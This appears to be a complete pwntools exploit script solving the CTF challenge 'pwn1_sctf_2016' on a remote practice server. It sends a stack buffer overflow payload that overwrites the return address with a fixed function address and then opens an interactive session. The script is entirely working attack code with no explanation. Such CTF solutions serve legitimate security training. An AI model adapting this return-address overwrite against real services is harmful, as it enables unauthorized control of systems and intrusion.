from pwn import *

#io = process('./pwn1_sctf_2016')
io = remote('node4.buuoj.cn',27892)
#io.recv()
payload = 20 * b'I' + 4* b'a'  + p32(0x08048F0D)
io.send(payload)
io.interactive()
